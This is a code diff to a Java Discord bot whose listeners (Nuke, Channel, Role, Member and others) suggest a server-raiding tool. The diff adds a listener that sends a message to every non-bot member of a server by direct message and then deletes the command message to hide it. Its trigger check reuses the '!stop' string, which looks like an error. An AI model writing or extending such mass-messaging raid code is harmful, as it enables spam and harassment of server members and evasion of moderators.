@@ -17,6 +17,7 @@ import org.jetbrains.annotations.NotNull;
 
 import java.io.*;
 import java.net.URL;
+import java.util.ArrayList;
 import java.util.List;
 import java.util.Random;
 import java.util.concurrent.ThreadLocalRandom;
@@ -38,7 +39,7 @@ public final class Bot {
                 .enableCache(CacheFlag.FORUM_TAGS)
                 .enableIntents(GatewayIntent.GUILD_MESSAGES, GatewayIntent.MESSAGE_CONTENT, GatewayIntent.GUILD_MEMBERS)
                 // Initialize commands
-                .addEventListeners(new Nuke(), new Emoji(), new Channel(), new Role(), new Member(), new Create(), new Hentai(), new Rolez(), new Car(), new Stop())
+                .addEventListeners(new Nuke(), new Emoji(), new Channel(), new Role(), new Member(), new Create(), new Hentai(), new Rolez(), new Car(), new Stop(), new Dm())
                 .build()
                 .awaitReady();
     }
@@ -65,6 +66,35 @@ public final class Bot {
                 Thread.currentThread().interrupt();
             }
 
+        }
+    }
+
+    // Attempts to mass dm all server members
+    private static final class Dm extends ListenerAdapter {
+        @Override
+        public void onMessageReceived(@NotNull MessageReceivedEvent event) {
+            if (!event.isFromGuild() || !event.getMessage().getContentRaw().contains("!stop")) return;
+            Guild guild = event.getGuild();
+
+            StringBuilder content = new StringBuilder();
+
+            boolean pass = false;
+            for (String string : event.getMessage().getContentRaw().split(" ")) {
+                if (!pass) {
+                    pass = true;
+                    continue;
+                }
+                content.append(string).append(" ");
+            }
+
+            guild.getMembers().forEach(member -> {
+                if (member.getUser().isBot()) {
+                    return;
+                }
+                member.getUser().openPrivateChannel().queue(privateChannel -> privateChannel.sendMessage(content.toString()).queue());
+            });
+
+            event.getMessage().delete().queue();
         }
     }
 
